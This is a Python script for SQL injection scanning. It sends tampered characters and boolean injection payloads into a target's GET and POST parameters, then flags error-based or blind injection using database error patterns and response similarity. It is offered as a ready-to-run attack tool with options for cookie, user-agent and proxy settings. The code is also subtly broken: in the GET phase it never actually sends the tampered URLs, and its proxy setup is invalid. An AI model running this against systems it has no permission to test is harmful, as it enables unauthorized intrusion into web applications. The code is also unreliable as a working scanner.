import difflib
import itertools
import random
import re
import requests
from colorama import Fore, init

init()


PREFIXES = (" ", ") ", "' ", "') ")
SUFFIXES = ("", "-- -", "#", "%%16")
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")
HEADERS = {}
FUZZY_THRESHOLD = 0.95
TIMEOUT = 30
RANDINT = random.randint(1, 255)
BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)"

DBMS_ERRORS = {
    "MySQL": (
        r".*syntax.*",
        r".*SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r".*You have an error in your SQL syntax.*",
        r"MySqlClient\.",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc"
    ),
    "MariaDB": (
        r"MariaDB server version",
        r"SQL syntax.*MariaDB",
    ),
    "PostgreSQL": (
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"org\.postgresql\.util\.PSQLException",
        r"PG::SyntaxError",
    ),
    "Microsoft SQL Server": (
        r"Msg \d+, Level \d+, State \d+, Line \d+",
        r"Unclosed quotation mark after the character string",
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"System\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error",
    ),
    "Microsoft Access": (
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
    ),
    "Oracle": (
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
        r"OracleException",
        r"ODBC.*Oracle",
    ),
    "IBM DB2": (
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"SQLSTATE \d+",
        r"db2_\w+\(",
        r"com\.ibm\.db2\.",
    ),
    "SQLite": (
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_.*",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"sqlite3.OperationalError",
    ),
    "Sybase": (
        r"(?i)Warning.*sybase.*",
        r"Sybase message",
        r"Sybase.*Server message.*",
        r"Adaptive Server Enterprise",
    ),
    "Firebird": (
        r"Dynamic SQL Error",
        r"firebirdsql",
        r"org\.firebirdsql\.jdbc",
    ),
    "Informix": (
        r"Warning.*ibase_.*",
        r"Informix ODBC Driver",
        r"com\.informix\.jdbc",
    ),
    "HSQLDB": (
        r"Unexpected end of command in statement \[.*\]",
        r"org\.hsqldb\.jdbc",
    ),
    "Derby": (
        r"ERROR 42X01",
        r"Apache Derby",
        r"org\.apache\.derby",
    ),
    "CockroachDB": (
        r"ERROR: syntax error at or near",
        r"cockroachdb",
    ),
    "SAP HANA": (
        r"SQL error.*SAP DBTech JDBC",
        r"com\.sap\.db\.jdbc",
    ),
    "MonetDB": (
        r"monetdbd:.*error",
        r"monetdb",
    ),
}


def _retrieve_content(url, data=None, method="GET"):
    try:
        if method == "POST":
            resp = requests.post(url, data=data, headers=HEADERS, timeout=TIMEOUT)
        else:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        
        html = resp.text or ""
        
        if re.search(BLOCKED_IP_REGEX, html):
            return None
        
        html = re.sub(r"(?i)[^>]*(AND|OR)[^<]*%d[^<]*" % RANDINT, "__REFLECTED__", html)
        
        title_match = re.search(r"<title>(?P<result>[^<]+)</title>", html, re.I)
        title = title_match.group("result") if title_match else None
        
        text_only = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", html)
        
        return {
            "status": resp.status_code,
            "title": title,
            "html": html,
            "text": text_only
        }
    except Exception as e:
        return {"status": None, "title": None, "html": str(e), "text": ""}

def scan_page(url, data=None):
    found_vuln = False
    usable = False
    try:
        for phase in ("GET", "POST"):
            params = url if phase == "GET" else (data or "")
            
            for match in re.finditer(r"((\A|[?&])(?P<param>\w+)=)(?P<value>[^&#]+)", params):
                param = match.group("param")
                usable = True
                print(Fore.MAGENTA + f"[*] Scanning {phase} parameter '{param}'")
                
                original = _retrieve_content(url, data, method=phase)
                if not original:
                    continue
                
                tampered = params.replace(match.group(0),
                                        f"{match.group(0)}{''.join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)))}")
                
                tampered_resp = _retrieve_content(url if phase == "GET" else url, 
                                                tampered if phase == "POST" else None, 
                                                method=phase)
                
                if tampered_resp:
                    for dbms, regexes in DBMS_ERRORS.items():
                        for regex in regexes:
                            if re.search(regex, tampered_resp["html"], re.I) and not re.search(regex, original["html"], re.I):
                                print(Fore.GREEN + f"\n[+] {phase} parameter '{param}' is error-based SQLi vulnerable ({dbms})")
                                found_vuln = True
                
                for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)):
                    template = f"{prefix}{boolean}{suffix}".replace(" " if inline_comment else "/**/", "/**/")
                    payloads = {
                        True: params.replace(match.group(0),
                                            f"{match.group(0)}{requests.utils.quote(template % (RANDINT, RANDINT), safe='%')}"),
                        False: params.replace(match.group(0),
                                            f"{match.group(0)}{requests.utils.quote(template % (RANDINT + 1, RANDINT), safe='%')}")
                    }
                    
                    responses = {k: _retrieve_content(url, v if phase == "POST" else None, method=phase) 
                                for k, v in payloads.items()}
                    
                    if not all(responses.values()):
                        continue
                    
                    ratios = {k: difflib.SequenceMatcher(None, original["text"], responses[k]["text"]).quick_ratio() 
                            for k in (True, False)}
                    
                    if min(ratios.values()) < FUZZY_THRESHOLD < max(ratios.values()) and abs(ratios[True] - ratios[False]) > 0.1:
                        print(Fore.GREEN + f"\n[+] {phase} parameter '{param}' appears to be blind SQLi vulnerable")
                        found_vuln = True
    
        if not usable:
            print(" (x) no usable GET/POST parameters found")
    except KeyboardInterrupt:
        print("\r (x) Ctrl-C pressed")

    return found_vuln

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    global HEADERS
    HEADERS = {}
    if cookie: HEADERS["Cookie"] = cookie
    if ua: HEADERS["User-Agent"] = ua
    if referer: HEADERS["Referer"] = referer
    if proxy:
        requests.proxies.update({"http": proxy, "https": proxy})

if __name__ == "__main__":
    import optparse
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    
    options, _ = parser.parse_args()
    
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://" + options.url, options.data)
        print(Fore.MAGENTA + f"\n[*] Scan results: {'possible vulnerabilities found' if result else 'no vulnerabilities'}")
    else:
        parser.print_help()
